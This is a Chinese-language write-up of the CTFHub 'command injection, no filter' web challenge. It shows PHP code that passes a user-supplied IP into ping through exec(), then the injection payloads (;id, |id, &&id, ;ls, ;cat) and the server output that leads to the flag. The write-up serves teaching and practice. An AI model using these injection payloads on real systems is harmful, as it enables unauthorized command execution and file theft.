---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 命令注入"
date: 2026-10-28

skill: "web-rce/命令注入"
completed: true
---

# CTFHub Writeup - 命令注入

## 题目类型

Web

## 题目描述

CTFHub 命令注入-无过滤
IP :
 
<?php

$res = FALSE;

if (isset($_GET['ip']) && $_GET['ip']) {
    $cmd = "ping -c 4 {$_GET['ip']}";
    exec($cmd, $res);
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>CTFHub 命令注入-无过滤</title>
</head>
<body>

<h1>CTFHub 命令注入-无过滤</h1>

<form action="#" method="GET">
    <label for="ip">IP : </label><br>
    <input type="text" id="ip" name="ip">
    <input type="submit" value="Ping">
</form>

<hr>

<pre>
<?php
if ($res) {
    print_r($res);
}
?>
</pre>

<?php
show_source(__FILE__);
?>

</body>
</html>


## 解题过程

<br>1. 先发送正常请求确认功能：\`curl.exe -s "http://.../?ip=127.0.0.1"\`。响应的 \`\<pre\>\` 中出现 ping 的四行结果，说明 \`exec\` 将标准输出按行放入数组，并由 \`print\_r\` 打印。
<br>2. 随后在参数中注入命令分隔符：\`curl.exe -s "http://.../?ip=127.0.0.1%3Bid"\`，其中 \`%3B\` 是 \`;\` 的 URL 编码。响应数组末尾出现 \`\[9\] =\> uid=82(www-data) gid=82(www-data) groups=82(www-data)\`，说明实际执行了 \`ping -c 4 127.0.0.1;id\`。
<br>3. 继续测试其他分隔符：\`?ip=127.0.0.1\|id\` 的响应中 \`\[0\]\` 为 \`uid=82(www-data)\`，\`?ip=127.0.0.1&&id\` 的响应中 \`\[9\]\` 为 \`uid=82(www-data)\`，说明 \`\|\` 与 \`&&\` 也可用于拼接命令。
<br>4. 枚举 Web 目录：\`?ip=;ls -la /var/www/html\`。响应中看到 \`88342883620205.php\` 和 \`index.php\`，其中 \`88342883620205.php\` 为 42 字节，文件名是随机数字。
<br>5. 读取该文件：\`?ip=;cat /var/www/html/88342883620205.php\`。响应中 \`\[0\]\` 返回 \`\<?php // ctfhub\{545367e7ece78510e7f0a2e3\}\`，得到 flag。

## 其他方法

已记录的其他尝试是使用不同 shell 分隔符：\`\|\` 与 \`&&\` 均能拼接 \`id\` 并回显当前用户，说明这两个分隔符也能触发命令执行。


## 疑问与解答

### 1.

<br>问题：为什么输入 \`127.0.0.1;id\` 后服务器会执行 \`id\`？
<br>解答：源码把 \`$\_GET\['ip'\]\` 直接拼进 \`ping -c 4 ...\` 并交给 \`exec\`，\`;\` 在 shell 中表示顺序执行下一条命令，因此 \`ping\` 结束后会继续执行 \`id\`；\`%3B\` 只是 URL 传输编码，解码后仍是 \`;\`。

### 2.

<br>问题：为什么 \`exec\` 的输出会出现在页面的 \`\<pre\>\` 中？
<br>解答：\`exec\` 会把命令标准输出的每一行追加到结果数组，页面随后用 \`print\_r($res)\` 打印该数组，所以能看到 ping 行和注入命令的输出。

### 3.

<br>问题：\`;\`、\`&&\` 和 \`\|\` 在命令拼接中有什么区别？
<br>解答：\`;\` 无条件顺序执行后续命令；\`&&\` 仅当前一条命令成功时执行后续命令；\`\|\` 把前一条命令的输出作为后一条命令的输入，后一条命令本身仍会执行并产生自己的输出。


## 本题的核心逻辑：


<br>漏洞点在于后端把用户可控的 \`ip\` 参数直接拼接到系统命令中，未做转义或白名单校验；当参数包含 shell 元字符时，攻击者可追加 \`id\`、\`ls\`、\`cat\` 等命令。

<br>本题利用链是先确认命令执行回显，再枚举 Web 根目录，最后读取非常规文件名的 PHP 文件获取 flag；证据中 \`ls\` 发现随机数字文件名，\`cat\` 读到 \`ctfhub\{...\}\`。

<br>flag 文件名不含 \`flag\` 字样，因此仅按 \`\*flag\*\` 进行文件名搜索可能找不到目标，推测需要结合目录枚举观察随机命名或异常大小的文件。


## 笔记

这道题主要学习了：

<br>1. 命令注入的入口常是直接拼接用户输入到 shell 命令的代码；\`exec\`、\`system\`、\`shell\_exec\` 等函数都可能把拼接后的字符串交给 shell 解释。
<br>2. 验证注入时，正常功能回显可作为基线；使用 \`;id\`、\`\|id\`、\`&&id\` 等分隔符观察输出位置和当前用户，有助于确认执行上下文。
<br>3. 获取 flag 阶段要结合目录枚举；文件名可能不含 \`flag\`，需要留意随机命名、异常大小的文件，再使用 \`cat\` 读取。
